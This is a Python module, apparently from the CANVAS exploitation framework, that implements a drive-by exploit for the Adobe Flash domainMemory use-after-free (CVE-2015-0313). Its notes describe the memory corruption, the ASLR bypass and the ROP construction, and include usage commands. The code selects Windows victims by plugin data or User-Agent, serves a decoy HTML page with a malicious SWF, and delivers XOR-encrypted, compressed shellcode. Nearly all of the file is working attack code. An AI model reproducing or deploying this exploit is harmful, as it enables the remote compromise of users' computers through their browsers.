#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import zlib
import re

from shellcode import shellcodeGenerator

from Crypto.Cipher import XOR
from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
from shellcode.standalone.windows import payloads64

from exploitutils import *
from tcpexploit import *
import canvasengine


NAME                              = 'adobe_flash_domainMemory_uaf'
DESCRIPTION                       = 'Adobe Flash Player domainMemory UAF'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Adobe'
DOCUMENTATION['Date public']      = '02/02/2015'
DOCUMENTATION['References']       = ['https://www.trustwave.com/Resources/SpiderLabs-Blog/A-New-Zero-Day-of-Adobe-Flash-CVE-2015-0313-Exploited-in-the-Wild/']

DOCUMENTATION['Repeatability']    = 'One-shot'
DOCUMENTATION['VersionsAffected'] = '13.0.0.269 and 14.x through 16.x before 16.0.0.305 on Windows'
DOCUMENTATION['CVE Name']         = 'CVE-2015-0313'
DOCUMENTATION['CVE Url']          = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0313'
DOCUMENTATION['Notes']            = """

This module exploits a use-after free vulnerability on the Flash handling of the
ApplicationDomain.currentDomain.domainMemory when working with worker threads.
When a worker thread clears the domainMemory ByteArray, the ByteArray is freed
but the main thread keeps a reference to the ByteArray.

Exploitation is done by placing a Vector object on hole created while
freeing the domainMemory ByteArray. By using memory intrinsic operations it is
still possible to edit the domainMemory memory. This allows us to change the
allocated vector's size to 0xffffffff allowing us to read and write arbitrary
memory.

It bypasses ASLR leaking an object vector vtable pointer and builds the ROP
dinamically.

Tested on:
- Windows XP SP3 with IE 7 (Flash 16.0.0.296)
- Windows 7 x32 SP1 with IE 8 32 bits (Flash 16.0.0.296)
- Windows 7 x32 SP1 with IE 9 32 bits (Flash 16.0.0.296)
- Windows 7 x32 SP1 with IE 10 32 bits (Flash 16.0.0.296)
- Windows 7 x32 SP1 with IE 11 32 bits (Flash 16.0.0.296)
- Windows 7 x64 SP1 with IE 8 32 bits (Flash 16.0.0.296)
- Windows 8.1 x32 Release 3 with IE 11 32 bits (Flash 16.0.0.296) (Needs HTTP MOSDEF enabled)
- Firefox 37.0.2 (Flash 16.0.0.296) (needs sandbox bypass)

Usage:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:adobe_flash_domainMemory_uaf -O auto_detect_exploits:0
python commandlineInterface.py -v 17 -p5555
"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['DELIVERY']              = 'HTTP'

CHANGELOG                         = """
"""


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME
        self.filename        = "%s.html" % randomstring(8)
        self.swffilename     = 'Simpsons'
        self.plugin_info     = None # we want clientd to give us a plugin dict
        self.refresh_rate    = 30
        self.xorer           = XOR.new("\x5a")
        self.badstring       = '\x00'

    def createShellcode(self):
        self.shellcode = self.createWin32ClientSideShellcode()

    def is_vulnerable(self, info_dict):
        import pprint
        pprint.pprint(info_dict)
        if not self.is_windows(info_dict):
            self.log_error("This exploit only works on Windows targets!")
            return 0

        major, minor, build, patch = self.getFlashVersion(info_dict)
        return 1
        if major == 16:
            if minor == 0:
                if build == 0:
                    if patch == 296:
                        return 1

        self.log_error("A plugin for Flash player was not found!")

        return 0

    def makefile(self):
        """
        Makes the exploit HTML
        """
        self.getArgs()

        filedata="""
        <html lang="en">
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                <title>Blank Page</title>
            </head>
            <body>
            <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%" id="Simpsons">
                            <param name="movie" value="SWFFILENAME.swf" />
                            <param name="quality" value="high" />
                            <param name="bgcolor" value="#ffffff" />
                            <param name="allowScriptAccess" value="sameDomain" />
                            <param name="allowFullScreen" value="true" />
                            <!--[if !IE]>-->
                            <object type="application/x-shockwave-flash" data="Simpsons.swf" width="100%" height="100%">
                                <param name="quality" value="high" />
                                <param name="bgcolor" value="#ffffff" />
                                <param name="allowScriptAccess" value="sameDomain" />
                                <param name="allowFullScreen" value="true" />
                            </object>
                            <!--<![endif]-->
                        </object>
            </body>
        </html>"""

        filedata = filedata.replace('SWFFILENAME', self.swffilename)
        filedata = filedata.replace('        ','')
        return filedata

    def makeSWF(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.swffilename + '.swf'), 'rb') as f:
            return f.read()

    def makesploit(self, clientheader, clientbody):
        self.nlog("\n---------------\nmakesploit - URL = %s\n---------------\n" % clientheader.URL)

        h = header('SERVER')
        b = body()

        if self.plugin_info:
            info_dict = self.plugin_info
            self.log_info("We got a plugin info for this target - thanks clientd!")

            if self.is_vulnerable(info_dict):
                self.log_info("This client is most likely vulnerable")
                self.createShellcode()
            else:
                self.log_error("Bailing on this client as it is not likely to be vulnerable")
                return None, None
        else:
            # if there is no info about plugins, at least we can filter using
            # the user-agent making sure target is Windows
            useragent = clientheader.getStrValue(['User-Agent'])
            self.log("User-Agent = %s" % useragent)
            if "windows" in useragent.lower():
                self.log_info("This client is likely to be vulnerable")
                self.createShellcode()
            else:
                self.log_error("Bailing on this client as it is not likely to be vulnerable")
                return None, None

        if clientheader.URL.count(self.filename):
            self.nlog('Serving HTML file')
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type', 'text/html')

        elif clientheader.URL.count(self.swffilename):
            self.nlog('Serving SWF file')
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type', 'application/x-shockwave-flash')
            self.nlog('Served SWF file')

        elif clientheader.URL.count("code"):
            h.addHeader('Content-Type', 'application/octet-stream')
            b.setBody(self.xorer.encrypt(zlib.compress(self.shellcode)))

        else:
            self.nlog('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'text/html')

        return h, b

    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")

    def run(self):
        self.getArgs()

        # Build the html that triggers the vulnerability
        filedata = self.makefile()
        self.nlog('Opening %s for output' % self.filename)
        fd=file(self.filename, 'wb+')
        fd.write(filedata)
        fd.close()
        self.nlog('Wrote exploit HTML to %s' % self.filename)

        return 1


if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
